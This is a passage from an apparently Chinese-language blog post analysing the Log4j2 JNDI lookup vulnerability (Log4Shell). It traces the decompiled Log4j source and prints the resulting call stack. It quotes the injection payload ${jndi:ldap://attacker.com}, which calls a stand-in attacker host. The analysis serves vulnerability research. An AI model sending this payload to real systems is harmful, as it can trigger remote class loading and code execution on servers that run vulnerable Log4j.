</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=k>for</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>varNameExprChars</span><span class=p>.</span><span class=na>length</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=n>substitutionInVariablesEnabled</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>prefixMatcher</span><span class=p>.</span><span class=na>isMatch</span><span class=p>(</span><span class=n>varNameExprChars</span><span class=p>,</span><span class=w> </span><span class=n>i</span><span class=p>,</span><span class=w> </span><span class=n>i</span><span class=p>,</span><span class=w> </span><span class=n>varNameExprChars</span><span class=p>.</span><span class=na>length</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w> </span><span class=o>++</span><span class=n>i</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                        </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>valueDelimiterMatchLen</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>valueDelimiterMatcher</span><span class=p>.</span><span class=na>isMatch</span><span class=p>(</span><span class=n>varNameExprChars</span><span class=p>,</span><span class=w> </span><span class=n>i</span><span class=p>))</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                            </span><span class=n>varName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>varNameExpr</span><span class=p>.</span><span class=na>substring</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>i</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                            </span><span class=n>varDefaultValue</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>varNameExpr</span><span class=p>.</span><span class=na>substring</span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>valueDelimiterMatchLen</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                            </span><span class=k>break</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>priorVariables</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=n>priorVariables</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ArrayList</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=n>priorVariables</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=p>(</span><span class=n>chars</span><span class=p>,</span><span class=w> </span><span class=n>offset</span><span class=p>,</span><span class=w> </span><span class=n>length</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>lengthChange</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=k>this</span><span class=p>.</span><span class=na>checkCyclicSubstitution</span><span class=p>(</span><span class=n>varName</span><span class=p>,</span><span class=w> </span><span class=n>priorVariables</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=n>priorVariables</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>varName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=n>String</span><span class=w> </span><span class=n>varValue</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>resolveVariable</span><span class=p>(</span><span class=n>event</span><span class=p>,</span><span class=w> </span><span class=n>varName</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>startPos</span><span class=p>,</span><span class=w> </span><span class=n>pos</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>varValue</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=n>varValue</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>varDefaultValue</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>varValue</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=kt>int</span><span class=w> </span><span class=n>varLen</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>varValue</span><span class=p>.</span><span class=na>length</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=n>buf</span><span class=p>.</span><span class=na>replace</span><span class=p>(</span><span class=n>startPos</span><span class=p>,</span><span class=w> </span><span class=n>pos</span><span class=p>,</span><span class=w> </span><span class=n>varValue</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=n>altered</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=kt>int</span><span class=w> </span><span class=n>change</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>substitute</span><span class=p>(</span><span class=n>event</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>startPos</span><span class=p>,</span><span class=w> </span><span class=n>varLen</span><span class=p>,</span><span class=w> </span><span class=n>priorVariables</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=n>change</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>varLen</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=p>(</span><span class=n>pos</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>startPos</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=n>pos</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>change</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=n>bufEnd</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>change</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=n>lengthChange</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>change</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=n>chars</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>getChars</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=n>priorVariables</span><span class=p>.</span><span class=na>remove</span><span class=p>(</span><span class=n>priorVariables</span><span class=p>.</span><span class=na>size</span><span class=p>()</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=k>break</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                            </span><span class=o>--</span><span class=n>nestedVarCount</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                            </span><span class=n>pos</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>endMatchLen</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>top</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>altered</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=n>1</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>lengthChange</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>看着很复杂，总结一下，这个方法实际上就是<code>${jndi:xxx}</code>这类表达式 ，同时通过递归和状态管理解决嵌套变量的问题，可以一步步看表达式的处理，处理好之后看到 resolveVariable 之后被执行（DNS网站多了一个回显），跟进 resolveVariable</p><p><img src=/p/log4j2-deserialization-vuln/8.png width=2606 height=1100 srcset="/p/log4j2-deserialization-vuln/8_hu_b6d8174f93c8db89.png 480w, /p/log4j2-deserialization-vuln/8_hu_b113523b387fe2cb.png 1024w" loading=lazy alt=img class=gallery-image data-flex-grow=236 data-flex-basis=568px></p><p>跟进之后再跟到 lookup</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>lookup</span><span class=p>(</span><span class=n>LogEvent</span><span class=w> </span><span class=n>event</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>var</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=kd>var</span><span class=w> </span><span class=err>== </span><span class=n>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>int</span><span class=w> </span><span class=n>prefixPos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>var</span><span class=p>.</span><span class=na>indexOf</span><span class=p>(</span><span class=n>58</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>prefixPos</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>prefix</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>var</span><span class=p>.</span><span class=na>substring</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>prefixPos</span><span class=p>).</span><span class=na>toLowerCase</span><span class=p>(</span><span class=n>Locale</span><span class=p>.</span><span class=na>US</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>var</span><span class=p>.</span><span class=na>substring</span><span class=p>(</span><span class=n>prefixPos</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>StrLookup</span><span class=w> </span><span class=n>lookup</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>StrLookup</span><span class=p>)</span><span class=k>this</span><span class=p>.</span><span class=na>lookups</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>prefix</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>lookup</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>ConfigurationAware</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>((</span><span class=n>ConfigurationAware</span><span class=p>)</span><span class=n>lookup</span><span class=p>).</span><span class=na>setConfiguration</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>configuration</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>lookup</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>event</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=n>lookup</span><span class=p>.</span><span class=na>lookup</span><span class=p>(</span><span class=n>name</span><span class=p>)</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>lookup</span><span class=p>.</span><span class=na>lookup</span><span class=p>(</span><span class=n>event</span><span class=p>,</span><span class=w> </span><span class=n>name</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>return</span><span class=w> </span><span class=n>value</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kd>var</span><span class=w> </span><span class=err>= </span><span class=n>var</span><span class=p>.</span><span class=na>substring</span><span class=p>(</span><span class=n>prefixPos</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>defaultLookup</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=n>event</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>defaultLookup</span><span class=p>.</span><span class=na>lookup</span><span class=p>(</span><span class=n>var</span><span class=p>)</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>defaultLookup</span><span class=p>.</span><span class=na>lookup</span><span class=p>(</span><span class=n>event</span><span class=p>,</span><span class=w> </span><span class=n>var</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>这个方法会对<code>${jndi:ldap://attacker.com}</code>表达式进行处理，提取 jndi 调用<code>JndiLookup.lookup("ldap://attacker.com")</code>，再继续跟进</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>lookup</span><span class=p>(</span><span class=n>LogEvent</span><span class=w> </span><span class=n>event</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>key</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>key</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>jndiName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>convertJndiName</span><span class=p>(</span><span class=n>key</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>try</span><span class=w> </span><span class=p>(</span><span class=n>JndiManager</span><span class=w> </span><span class=n>jndiManager</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>JndiManager</span><span class=p>.</span><span class=na>getDefaultManager</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>jndiManager</span><span class=p>.</span><span class=na>lookup</span><span class=p>(</span><span class=n>jndiName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>var7</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>valueOf</span><span class=p>(</span><span class=n>value</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=n>var7</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>NamingException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>LOGGER</span><span class=p>.</span><span class=na>warn</span><span class=p>(</span><span class=n>LOOKUP</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Error looking up JNDI resource [{}].&#34;</span><span class=p>,</span><span class=w> </span><span class=n>jndiName</span><span class=p>,</span><span class=w> </span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>调用<code>jndiManager.lookup("ldap://attacker.com"</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>T</span><span class=w> </span><span class=nf>lookup</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>name</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>NamingException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=n>T</span><span class=p>)</span><span class=k>this</span><span class=p>.</span><span class=na>context</span><span class=p>.</span><span class=na>lookup</span><span class=p>(</span><span class=n>name</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>发起远程请求，解析恶意类。完整调用栈</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>net</span><span class=p>.</span><span class=na>JndiManager</span><span class=p>.</span><span class=na>lookup</span><span class=p>(</span><span class=n>JndiManager</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>129</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>lookup</span><span class=p>.</span><span class=na>JndiLookup</span><span class=p>.</span><span class=na>lookup</span><span class=p>(</span><span class=n>JndiLookup</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>54</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>lookup</span><span class=p>.</span><span class=na>Interpolator</span><span class=p>.</span><span class=na>lookup</span><span class=p>(</span><span class=n>Interpolator</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>183</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>lookup</span><span class=p>.</span><span class=na>StrSubstitutor</span><span class=p>.</span><span class=na>resolveVariable</span><span class=p>(</span><span class=n>StrSubstitutor</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1054</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>lookup</span><span class=p>.</span><span class=na>StrSubstitutor</span><span class=p>.</span><span class=na>substitute</span><span class=p>(</span><span class=n>StrSubstitutor</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>976</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>lookup</span><span class=p>.</span><span class=na>StrSubstitutor</span><span class=p>.</span><span class=na>substitute</span><span class=p>(</span><span class=n>StrSubstitutor</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>872</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>lookup</span><span class=p>.</span><span class=na>StrSubstitutor</span><span class=p>.</span><span class=na>replace</span><span class=p>(</span><span class=n>StrSubstitutor</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>427</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>pattern</span><span class=p>.</span><span class=na>MessagePatternConverter</span><span class=p>.</span><span class=na>format</span><span class=p>(</span><span class=n>MessagePatternConverter</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>127</span><span class=p>)</span><span class=w>
